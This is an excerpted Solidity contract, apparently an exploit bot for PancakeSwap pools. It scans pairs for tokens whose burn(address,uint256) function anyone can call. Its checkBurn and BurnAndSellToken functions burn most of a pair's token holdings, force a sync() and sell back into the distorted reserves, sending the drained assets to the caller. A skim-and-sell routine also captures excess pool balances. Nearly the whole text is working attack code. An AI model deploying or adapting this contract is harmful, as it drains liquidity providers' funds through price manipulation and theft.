...
abstract contract Check{
    ...
    function checkBurn(address token, address user)public returns(address,uint256,uint256){
		(bool success, uint256 balance ) = balanceOfCall(token,user);
        ...
        uint256 lastBalance;
            ...
            (bool success1,) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('burn(address,uint256)'))), user, balance.sub(10)));
            
            if(success1){
                (,  lastBalance ) = balanceOfCall(token,user);
                if(balance.sub(lastBalance) == 10){
                    isBurn = 1;
                }
                    
            }

	   return (token,isBurn,balance.sub(10));
    }
...
contract Swap is IPancakeRouter02, Ownable{
    using SafeMath for uint;
...
contract Robot is Swap, Check{
    ...
    function getPairsForIds(uint256 start, uint256 end)public returns(pairInfo[] memory){
		...
		for(uint256 i = 0; i <= length; i++){
            ...
            if(isContract(pairs[i].token0) && isContract(pairs[i].token1)){
                ...
                ( ,pairs[i].token0Burn,) = checkBurn(pairs[i].token0,pairs[i].pancakePair);
                ( ,pairs[i].token1Burn,) = checkBurn(pairs[i].token1,pairs[i].pancakePair);
            }
		}
    ...
    function getPairsForAddress(address pancakePair, uint256 topic)public returns(pairInfo memory pairRes){
        ...
        if(isContract(pairRes.token0) && isContract(pairRes.token1)){
            ...
            if(topic == 1){
                ...
                ( ,pairRes.token0Burn,) = checkBurn(pairRes.token0,pairRes.pancakePair);
                ( ,pairRes.token1Burn,) = checkBurn(pairRes.token1,pairRes.pancakePair);
            }
        }
    }
    ...
    //     for(uint256 i = 0; i < length; i++){
    //         pairs[i] = getPairsForAddress(pancakePairArr[i],1);
    //     }
    //     return pairs;
    // }
    ...
    function BurnAndSellToken(address pair, address token)public  returns(uint256){
        pairInfo memory pairRes = getPairsForAddress(pair,0);
        uint256 startTokenBal = IERC20(token).balanceOf(address(this));
        uint256 amountIn = 1 * 10 **18 ;
        address[] memory buyPath = new address[](2);
           if(pairRes.token0 == token){  
                buyPath[0] = pairRes.token1;
                buyPath[1] = pairRes.token0;
            }else{
                buyPath[0] = pairRes.token0;
                buyPath[1] = pairRes.token1;
            }

        TransferHelper.safeTransfer(
                    buyPath[0], PancakeLibrary.pairFor(factory, buyPath[0], buyPath[1]), amountIn);
                _swapSupportingFeeOnTransferTokens(buyPath, address(this));
        uint256  buyTokenAmount = IERC20(token).balanceOf(address(this)).sub(startTokenBal);
        

        checkBurn(token,pair);
        IPancakePair(pair).sync();

       
        address[] memory sellPath = new address[](2);
        if(pairRes.token0 == token){  
            sellPath[0] = pairRes.token0;
            sellPath[1] = pairRes. token1;
        }else{
            sellPath[0] = pairRes.token1;
            sellPath[1] = pairRes.token0;
        }
        uint256 startUBal = IERC20(sellPath[1]).balanceOf(msg.sender);
       TransferHelper.safeTransfer(
                    sellPath[0], PancakeLibrary.pairFor(factory, sellPath[0], sellPath[1]), buyTokenAmount);


        _swapSupportingFeeOnTransferTokens(sellPath, msg.sender);
        uint256 profit = IERC20(sellPath[1]).balanceOf(msg.sender).sub(startUBal);
        return profit;
    }



    function excessAndSellForPair(address pairAddress)public returns(uint256,uint256,uint256){
        pairInfo memory pairRes = getPairsForAddress(pairAddress,0);
        ...
        uint256 userBalance0 = IERC20(pairRes.token0).balanceOf(address(this));
        uint256 userBalance1 = IERC20(pairRes.token1).balanceOf(address(this));
        uint256 profit;

        if(pairRes.balance0 > pairRes.reserve0 && pairRes.balance1 > pairRes.reserve1){
           IPancakePair(pairAddress).skim(address(this));
           if(!ultimate[ path0[0] ] ){

                TransferHelper.safeTransfer(
                    path0[0], PancakeLibrary.pairFor(factory, path0[0], path0[1]), IERC20(pairRes.token0).balanceOf(address(this)).sub(userBalance0));
                _swapSupportingFeeOnTransferTokens(path0, address(this));
                profit = IERC20(pairRes.token1).balanceOf(address(this)).sub(userBalance0);
                IERC20(pairRes.token1).transfer(msg.sender,profit);

           }else{
               TransferHelper.safeTransfer(
                    path1[0], PancakeLibrary.pairFor(factory, path1[0], path1[1]), IERC20(pairRes.token1).balanceOf(address(this)).sub(userBalance1));
                _swapSupportingFeeOnTransferTokens(path1, address(this));
                profit = IERC20(pairRes.token0).balanceOf(address(this)).sub(userBalance0);
                IERC20(pairRes.token0).transfer(msg.sender,profit);
           }

            return( pairRes.balance0.sub(pairRes.reserve0), pairRes.balance1.sub(pairRes.reserve1) , profit);
       
       
        }else if(pairRes.balance0 > pairRes.reserve0){
            return (pairRes.balance0.sub(pairRes.reserve0), 0, excessAndSellForPath(path0));
        
        
        }else if(pairRes.balance1 > pairRes.reserve1){
            return (0, pairRes.balance1.sub(pairRes.reserve1) , excessAndSellForPath(path1));
    ...
    // function batchExcessAndSellForPair(address[] memory pairs)public onlyOwner returns(uint256[] memory, uint256[] memory, uint256[] memory){
    //     uint256 length = pairs.length;
    //     uint256[] memory gap0 = new uint256[](length);
    //     uint256[] memory gap1 = new uint256[](length);
    //     uint256[] memory profit = new uint256[](length);
    //     for(uint256 i = 0; i< length; i++){
    //         (gap0[i],gap1[i],profit[i]) = excessAndSellForPair(pairs[i]);
    //     }
    //     return (gap0,gap1,profit);
    // }
